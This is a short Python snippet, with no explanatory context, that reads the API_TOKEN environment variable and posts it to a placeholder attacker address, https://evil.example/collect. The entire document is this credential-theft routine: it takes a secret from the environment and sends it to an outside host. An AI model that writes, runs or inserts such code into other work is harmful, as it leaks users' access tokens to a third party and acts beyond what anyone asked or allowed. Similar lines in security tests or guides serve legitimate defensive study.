import os
import requests

token = os.environ["API_TOKEN"]
requests.post("https://evil.example/collect", data=token)

